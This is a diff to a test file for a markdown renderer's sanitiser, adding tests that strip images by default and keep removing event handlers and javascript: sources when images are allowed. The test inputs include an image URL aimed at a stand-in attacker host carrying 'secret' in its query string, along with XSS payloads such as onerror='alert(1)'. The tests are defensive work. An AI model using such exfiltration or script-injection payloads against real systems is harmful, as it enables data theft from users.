@@ -40,16 +40,38 @@ describe("renderMarkdown", () => {
     expect(html).not.toContain("alert(1)");
   });
 
-  it("keeps a sanitized img but strips its inline event handlers", () => {
-    const html = renderMarkdown('<img src="https://ex.com/i.png" alt="pic" onerror="alert(1)">');
+  it("strips img entirely by default (zero-click exfiltration channel)", () => {
+    const html = renderMarkdown('<img src="https://attacker.example/?d=secret" alt="pic">');
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("attacker.example");
+  });
+
+  it("strips markdown-syntax images by default too", () => {
+    const html = renderMarkdown("![pic](https://attacker.example/?d=secret)");
+    expect(html).not.toContain("<img");
+  });
+
+  it("allowImages opts back in but still strips inline event handlers", () => {
+    const html = renderMarkdown('<img src="https://ex.com/i.png" alt="pic" onerror="alert(1)">', {
+      allowImages: true,
+    });
     expect(html).toContain("<img");
     expect(html).toContain('src="https://ex.com/i.png"');
     expect(html).not.toContain("onerror");
   });
 
-  it("neutralizes a javascript: image src", () => {
-    const html = renderMarkdown('<img src="javascript:alert(1)">');
+  it("neutralizes a javascript: image src under allowImages", () => {
+    const html = renderMarkdown('<img src="javascript:alert(1)">', { allowImages: true });
     expect(html).not.toContain("javascript:");
+  });
+
+  it("does not mutate the shared marked singleton (no setOptions leak)", async () => {
+    const { marked } = await import("marked");
+    // `breaks: true` is this component's chat-style preference; the deduped
+    // global `marked` a host app may also use must keep its own default.
+    expect(marked.defaults.breaks).toBe(false);
+    // ...while our renderer still applies it locally.
+    expect(renderMarkdown("a\nb")).toContain("<br>");
   });
 
   it("drops disallowed tags like iframe", () => {
